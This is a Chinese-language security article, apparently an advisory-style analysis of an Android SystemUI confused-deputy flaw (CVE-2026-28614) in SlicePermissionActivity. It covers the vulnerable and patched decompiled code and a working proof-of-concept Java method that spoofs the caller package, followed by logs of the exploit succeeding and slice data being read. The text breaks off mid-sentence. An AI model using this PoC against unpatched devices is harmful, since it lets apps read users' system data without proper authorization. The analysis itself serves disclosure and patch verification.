---
title: 恶意 App 如何让安卓系统替自己“开绿灯”？
url: https://mp.weixin.qq.com/s/BDJU4pbuCfr-EnQe61D32Q
source: Doonsec's feed
date: 2026-09-11
fetch_date: 2026-09-12T06:43:33.893581
---

# 恶意 App 如何让安卓系统替自己“开绿灯”？

# 恶意 App 如何让安卓系统替自己“开绿灯”？

原创

openclaw雪人分身
openclaw雪人分身

大山子雪人

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

# ASB-A-486385459 漏洞分析报告

**CVE**: CVE-2026-28614
**日期**: 2026-09-11
**严重级别**: High
**类型**: EoP（本地权限提升）— Confused Deputy
**补丁 SPL**: 2026-09-01

---

## 一、漏洞概述

### 基本信息

| 字段 | 内容 |
| --- | --- |
| 漏洞 ID | ASB-A-486385459 / CVE-2026-28614 |
| 受影响组件 | `platform/frameworks/base` → SystemUI |
| 受影响文件 | `packages/SystemUI/src/com/android/systemui/SlicePermissionActivity.java` |
| 受影响版本 | Android 14 / 15 / 16 / 16-qpr2 / 17 / 17-next |
| 漏洞类型 | Confused Deputy → 本地权限提升 |
| 用户交互 | 需要（用户点击弹窗一次） |
| 额外权限 | 无需 |

### 漏洞描述

`SlicePermissionActivity` 的 `onCreate` 方法中，`mCallingPkg`（调用方包名）直接取自 Intent Extra，未经身份验证。由于该 Activity 是 `exported` 且无权限保护，任意应用可直接启动并伪造调用方身份，令 SystemUI 以系统权限为攻击者控制的包授予 Slice 内容权限，构成"混淆代理人"（Confused Deputy）攻击。

---

## 二、ROM 漏洞状态分析

### 2.1 测试环境

分析对象为 `cubs-ota` 系列两个 OTA 包：

| ROM | 文件名 | 构建日期 | Android | SPL |
| --- | --- | --- | --- | --- |
| cubs\_a | `cubs-ota-cd1a.260714.001.a9-4834ee9d.zip` | 2026-07-24 | 17 | **2026-08-05** |
| cubs\_b | `cubs-ota-cd1a.260905.001.b1-2c1865b8.zip` | 2026-09-02 | 17 | **2026-09-01** |

### 2.2 分析方法

```
OTA zip
  └─ payload-dumper-go → system.img / system_ext.img (erofs)
       └─ fsck.erofs --extract → 文件系统目录
            └─ priv-app/SystemUIGoogle/SystemUIGoogle.apk
                 └─ 原始字节解析 dex → jadx --single-class
                      └─ SlicePermissionActivity.java
```

### 2.3 漏洞状态对比

**cubs\_a（SPL 2026-08-05，漏洞存在）**

```
// SlicePermissionActivity.java — onCreate
this.mCallingPkg = getIntent().getStringExtra("pkg");  // ← 直接信任 Intent Extra，未校验

// ... EventLog 记录但不阻断 ...

// 以伪造的 mCallingPkg 加载应用标签展示给用户
String unicodeWrap = packageManager
    .getApplicationInfo(this.mCallingPkg, 0)   // 攻击者控制的值
    .loadSafeLabel(...).toString();

// onClick 中：向攻击者指定的包授权
grantPermissionFromUser(this.mUri, this.mCallingPkg, ...);
```

**cubs\_b（SPL 2026-09-01，已修复）**

新增方法 `isCallerValid()`，通过 Binder 层 API 验证真实调用方身份：

```
public final boolean isCallerValid() {
    // getLaunchedFromPackage() 来自 Activity Manager Binder 记录，无法通过 Intent Extra 伪造
    String launchedFromPackage = getLaunchedFromPackage();
    if (launchedFromPackage == null) {
        launchedFromPackage = getCallingPackage();  // 备用
    }
    // 仅允许 Provider 自身或系统进程发起
    if (launchedFromPackage != null && (
            launchedFromPackage.equals(this.mProviderPkg) ||
            launchedFromPackage.equals(getPackageName()) ||
            "android".equals(launchedFromPackage))) {
        return true;
    }
    Log.e("SlicePermissionActivity",
        "Direct launch blocked. Expected provider " + this.mProviderPkg +
        " or system, but got " + launchedFromPackage);
    return false;
}
```

在 `onCreate` 中注入拦截点（EventLog 之后、UI 展示之前）：

```
if (!isCallerValid()) {
    finish();   // ← 非法调用直接终止
    return;
}
```

### 2.4 补丁有效性对比

| 检查点 | cubs\_a（漏洞） | cubs\_b（已修复） |
| --- | --- | --- |
| `isCallerValid()` 方法 | **不存在** | **存在** |
| `getLaunchedFromPackage()` 调用 | 无 | 有，用于 Binder 级身份验证 |
| `onCreate` 中 `finish()` 拦截 | 无 | 有，校验失败立即终止 |
| 日志行为 | 仅 `EventLog.writeEvent`（不阻断） | `Log.e` + `finish()`（阻断） |
| retrace hash | `cf4445cd...` | `80c4f309...` |

---

## 三、漏洞原理深度分析

### 3.1 Confused Deputy 攻击模型

正常流程中，Slice 权限弹窗仅应由 Slice Content Provider 通过 `PendingIntent` 触发：

```
正常流程:
  Launcher (需要访问 Slice)
      │ bindSlice(uri)
      ▼
  SliceProvider (com.android.settings)
      │ 主动创建 PendingIntent → 触发 SlicePermissionActivity
      ▼
  SlicePermissionActivity (SystemUI)
      │ 验证: 来自 Provider 本身，合法
      ▼
  grantPermissionFromUser(uri, callingPkg, ...)
```

攻击流程（利用漏洞）：

```
攻击流程:
  恶意 App (com.evil)
      │ startActivity(Intent)
      │   action  = com.android.intent.action.REQUEST_SLICE_PERMISSION
      │   pkg     = "com.example.slicepoc"   ← 伪造为自身或任意包名
      │   slice_uri= content://victim.provider/...
      ▼
  SlicePermissionActivity (SystemUI 进程，持有系统权限)
      │ mCallingPkg = getIntent().getStringExtra("pkg")
      │             = "com.example.slicepoc"  ← 直接采信，无任何验证
      │
      │ 弹窗: "Allow SlicePoc to show [Provider] slices?"
      │ （用户看到的是攻击者控制的包名，对应合理的显示名称）
      ▼
  用户点击 ALLOW
      ▼
  grantPermissionFromUser(uri, "com.example.slicepoc", permanent=true)
      ← SystemUI 作为"混淆代理人"完成了授权
```

### 3.2 现有防御措施的不足

漏洞代码中存在 `provider_pkg` 校验逻辑，但仅记录日志，**不阻断执行**：

```
String stringExtra = getIntent().getStringExtra("provider_pkg");
if (stringExtra != null && !this.mProviderPkg.equals(stringExtra)) {
    // ↓ 只写 EventLog，继续执行，弹窗照常展示
    EventLog.writeEvent(1397638484, "159145361", Integer.valueOf(i));
}
// ← 没有 return，没有 finish()
```

### 3.3 授权后攻击面

| Slice Authority | 可读取内容 | 敏感度 |
| --- | --- | --- |
| `com.android.systemui.keyguard` | 锁屏日期、下个闹钟时间、媒体信息 | 中 |
| `com.android.settings.slices` | Wi-Fi 名称、蓝牙状态、飞行模式、位置开关等系统设置当前值及关键词 | 中高 |
| `android.settings.slices` | 同上，含完整文本内容（标题、摘要、关键词） | 高 |
| 第三方应用 Slice | 取决于应用实现 | 不定 |

---

## 四、PoC 验证

### 4.1 测试环境

* • 设备：Android 模拟器（emulator-5554）
* • Android 版本：15（SPL 2024-09-05）
* • 漏洞状态：`isCallerValid()` 不存在，**可利用**

### 4.2 PoC 应用核心代码

```
private void launchExploit() {
    Uri sliceUri = Uri.parse("content://com.android.systemui.keyguard/main");

    Intent intent = new Intent("com.android.intent.action.REQUEST_SLICE_PERMISSION");
    intent.setComponent(new ComponentName(
            "com.android.systemui",
            "com.android.systemui.SlicePermissionActivity"));

    // Confused Deputy: 伪造调用方身份
    intent.putExtra("slice_uri", sliceUri);
    intent.putExtra("pkg", getPackageName());          // ← 指向自身（攻击者）
    intent.putExtra("provider_pkg", "com.android.systemui");

    startActivity(intent);
}
```

### 4.3 验证截图时间线

**Step 1：初始状态（权限未授予）**

```
[checkSlicePermission]
  com.android.systemui.keyguard: DENIED ✗
  com.android.settings.slices:   DENIED ✗
[已授权 Slice]
  (空)
```

**Step 2：触发弹窗**

弹窗由 SystemUI 进程弹出，显示：

> **Allow SlicePoc to show System UI slices?**
>
> * • It can take actions inside System UI
> * • It can read information from System UI
>   ☐ Allow SlicePoc to show slices from any app

`SlicePermissionActivity` 成功被直接启动（ActivityTaskManager 日志确认）：

```
I ActivityTaskManager: START u0 {act=com.android.intent.action.REQUEST_SLICE_PERMISSION
  cmp=com.android.systemui/.SlicePermissionActivity} with LAUNCH_MULTIPLE from uid 10151
```

**Step 3：用户点击 ALLOW — 权限持久化写入**

系统在 `/data/system/slice/` 写入权限记录：

```
<!-- /data/system/slice/client_com.example.slicepoc@0 -->
<client pkg="com.example.slicepoc@0" fullAccess="1">
  <authority authority="com.android.systemui.keyguard"
             pkg="com.android.systemui@0">
    <path></path>
  </authority>
</client>
```

`fullAccess="1"` = 对该 authority 下**所有路径**永久授权。

**Step 4：授权后状态**

```
[checkSlicePermission]
  com.android.systemui.keyguard: GRANTED ✓   ← 漏洞利用成功
  com.android.settings.slices:   GRANTED ✓
```

### 4.4 数据读取验证（bindSlice）

利用 `SliceManager.bindSlice()` API 实际读取到各 Provider 数据：

```
[bindSlice 结果]
  ✓ systemui.keyguard/main:
      Fri, Sep 11                          ← 锁屏日期
  ✓ systemui.keyguard/next_alarm:
      Fri, Sep 11                          ← 下个闹钟
  ✓ systemui.keyguard/media:
      Fri, Sep 11
  ✓ settings.slices/action/wifi:           ← [partial] 标志，需 pin 后完整加载
      (no text items, hints=[partial])
  ✓ settings.slices/action/bluetooth:
      (no text items, hints=[partial])
  ✓ settings.slices/action/airplane_mode:
      (no text items, hints=[partial])
  ✓ settings.slices/action/battery_saver:
      (no text items, hints=[partial])
  ✓ settings.slices/action/location:
      (no text items, hints=[partial])
  ✓ settings.slices/action/nfc:
      (no text items, hints=[partial])
  ✓ android.settings.slices/action/wifi:
      [int:-1] Wi‑Fi | wifi | wi-fi | data | network connection | wireless | wi fi | internet |
                ↑ 开关状态整数    ↑ 完整文本内容及搜索关键词
```

`android.settings.slices` authority 返回了完整的 Wi-Fi 设置项信息，包括：

* • 当前状态整数值（`int:-1` 表示开启）
* • 显示标题（`Wi‑Fi`）
* • 搜索关键词列表（`wifi | wi-fi | data | network connection | wireless | i...